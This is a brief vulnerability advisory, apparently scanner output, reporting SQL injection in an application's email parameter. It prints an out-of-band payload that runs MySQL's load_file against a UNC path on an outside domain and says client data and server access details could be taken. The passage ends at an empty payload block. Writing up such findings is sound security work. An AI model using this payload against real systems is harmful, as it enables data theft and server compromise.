## Description:
The email parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load_file('\\\\ke2v0nog1ghmfe276ddp7smbi2ovcm7aydm59vxk.tupaputka.com\\lhc'))+'
was submitted in the email parameter. This payload injects a SQL
sub-query that calls MySQL's load_file function with a UNC file path
that references a URL on an external domain. The application
interacted with that domain, indicating that the injected SQL query
was executed. The attacker can get all the information for the clients
of this application from the server, and very sensitive information
for accessing the server by exploiting the vulnerability.

[+]Payload:
```MySQL
